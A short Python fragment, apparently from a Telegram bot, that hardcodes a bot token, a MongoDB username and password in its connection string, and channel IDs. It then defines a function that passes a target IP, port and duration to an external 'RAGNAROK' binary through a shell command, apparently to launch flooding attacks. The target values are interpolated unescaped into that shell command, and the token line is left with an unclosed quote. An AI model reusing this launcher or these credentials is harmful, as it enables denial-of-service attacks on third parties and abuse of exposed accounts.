...
TOKEN = '8145364486:AAHRmS_rSBcKyPjcwRMk9gQDYVBYdTE7Xy0
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = 1002379716140
CHANNEL_ID = -1002379716140
error_channel_id = -1002379716140
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f". RAGNAROK {target_ip} {target_port} {duration} 800")
